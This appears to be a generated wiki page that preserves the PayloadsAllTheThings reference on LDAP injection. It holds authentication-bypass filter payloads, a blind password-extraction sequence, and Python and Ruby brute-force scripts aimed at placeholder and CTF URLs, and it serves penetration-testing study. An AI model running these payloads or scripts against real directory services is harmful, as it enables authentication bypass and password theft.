---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# LDAP Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-ldap-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/LDAP Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LDAP Injection](../../topics/ldap-injection/ldap-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-ldap-injection-readme |
| name | LDAP Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# LDAP Injection\n\n> LDAP Injection is an attack used to exploit web based applications that construct LDAP statements\
  \ based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements\
  \ using a local proxy.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Authentication Bypass](#authentication-bypass)\n\
  \    * [Blind Exploitation](#blind-exploitation)\n* [Defaults Attributes](#defaults-attributes)\n* [Exploiting userPassword\
  \ Attribute](#exploiting-userpassword-attribute)\n* [Scripts](#scripts)\n    * [Discover Valid LDAP Fields](#discover-valid-ldap-fields)\n\
  \    * [Special Blind LDAP Injection](#special-blind-ldap-injection)\n* [Labs](#labs)\n* [References](#references)\n\n##\
  \ Methodology\n\nLDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries\
  \ without proper sanitization or escaping\n\n### Authentication Bypass\n\nAttempt to manipulate the filter logic by injecting\
  \ always-true conditions.\n\n**Example 1**: This LDAP query exploits logical operators in the query structure to potentially\
  \ bypass authentication\n\n```sql\nuser  = *)(uid=*))(|(uid=*\npass  = password\nquery = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\n\
  ```\n\n**Example 2**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication\n\
  \n```sql\nuser  = admin)(!(&(1=0\npass  = q))\nquery = (&(uid=admin)(!(&(1=0)(userPassword=q))))\n```\n\n### Blind Exploitation\n\
  \nThis scenario demonstrates LDAP blind exploitation using a technique similar to binary search or character-based brute-forcing\
  \ to discover sensitive information like passwords. It relies on the fact that LDAP filters respond differently to queries\
  \ based on whether the conditions match or not, without directly revealing the actual password.\n\n```sql\n(&(sn=administrator)(password=*))\
  \    : OK\n(&(sn=administrator)(password=A*))   : KO\n(&(sn=administrator)(password=B*))   : KO\n...\n(&(sn=administrator)(password=M*))\
  \   : OK\n(&(sn=administrator)(password=MA*))  : KO\n(&(sn=administrator)(password=MB*))  : KO\n...\n(&(sn=administrator)(password=MY*))\
  \  : OK\n(&(sn=administrator)(password=MYA*)) : KO\n(&(sn=administrator)(password=MYB*)) : KO\n(&(sn=administrator)(password=MYC*))\
  \ : KO\n...\n(&(sn=administrator)(password=MYK*)) : OK\n(&(sn=administrator)(password=MYKE)) : OK\n```\n\n**LDAP Filter\
  \ Breakdown**:\n\n* `&`: Logical AND operator, meaning all conditions inside must be true.\n* `(sn=administrator)`: Matches\
  \ entries where the sn (surname) attribute is administrator.\n* `(password=X*)`: Matches entries where the password starts\
  \ with X (case-sensitive). The asterisk (*) is a wildcard, representing any remaining characters.\n\n## Defaults Attributes\n\
  \nCan be used in an injection like `*)(ATTRIBUTE_HERE=*`\n\n```bash\nuserPassword\nsurname\nname\ncn\nsn\nobjectClass\n\
  mail\ngivenName\ncommonName\n```\n\n## Exploiting userPassword Attribute\n\n`userPassword` attribute is not a string like\
  \ the `cn` attribute for example but it’s an OCTET STRING\nIn LDAP, every object, type, operator etc. is referenced by an\
  \ OID : octetStringOrderingMatch (OID 2.5.13.18).\n\n> octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule\
  \ that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found.\
  \ The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the\
  \ zero bit to be considered less than the value with the one bit.\n\n```bash\nuserPassword:2.5.13.18:=\\xx (\\xx is a byte)\n\
  userPassword:2.5.13.18:=\\xx\\xx\nuserPassword:2.5.13.18:=\\xx\\xx\\xx\n```\n\n## Scripts\n\n### Discover Valid LDAP Fields\n\
  \n```python\n#!/usr/bin/python3\nimport requests\nimport string\n\nfields = []\nurl = 'https://URL.com/'\nf = open('dic',\
  \ 'r')\nworld = f.read().split('\\n')\nf.close()\n\nfor i in world:\n    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\\
  x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla))\n    if 'TRUE CONDITION' in r.text:\n     \
  \   fields.append(str(i))\n\nprint(fields)\n```\n\n### Special Blind LDAP Injection\n\n```python\n#!/usr/bin/python3\nimport\
  \ requests, string\nalphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"\n\nflag = \"\"\nfor i in\
  \ range(50):\n    print(\"[i] Looking for number \" + str(i))\n    for char in alphabet:\n        r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\"\
  \ + flag + char)\n        if (\"TRUE CONDITION\" in r.text):\n            flag += char\n            print(\"[+] Flag: \"\
  \ + flag)\n            break\n```\n\nExploitation script by [@noraj](https://github.com/noraj)\n\n```ruby\n#!/usr/bin/env\
  \ ruby\nrequire 'net/http'\nalphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')\n\nflag = ''\n\
  (0..50).each do |i|\n  puts(\"[i] Looking for number #{i}\")\n  alphabet.each do |char|\n    r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"\
  ))\n    if /TRUE CONDITION/.match?(r)\n      flag += char\n      puts(\"[+] Flag: #{flag}\")\n      break\n    end\n  end\n\
  end\n```\n\n## Labs\n\n* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)\n\
  * [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)\n\n## References\n\
  \n* [[European Cyber Week] - AdmYSion - Alan Marrec (Maki) - January 14, 2025](https://web.archive.org/web/20250114083154/https://www.maki.bzh/writeups/ecw2018admyssion/)\n\
  * [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://web.archive.org/web/20200924103615/https://0xukn.fr/posts/writeupecw2018admyssion/)\n\
  * [How To Configure OpenLDAP and Perform Administrative LDAP Tasks - Justin Ellingwood - May 30, 2015](https://web.archive.org/web/20260119175101/https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)\n\
  * [How To Manage and Use LDAP Servers with OpenLDAP Utilities - Justin Ellingwood - May 29, 2015](https://web.archive.org/web/20160305121823/https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)\n\
  * [LDAP Blind Explorer - Alonso Parada - August 12, 2011](https://web.archive.org/web/20160120073444/https://code.google.com/p/ldap-blind-explorer/)\n\
  * [LDAP Injection & Blind LDAP Injection - Chema Alonso, José Parada Gimeno - October 10, 2008](https://web.archive.org/web/20081010181534/http://blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n\
  * [LDAP Injection Prevention Cheat Sheet - OWASP - July 16, 2019](https://web.archive.org/web/20190719164052/https://www.owasp.org/index.php/LDAP_injection)"
_relative_path: LDAP Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/LDAP Injection/README.md
````
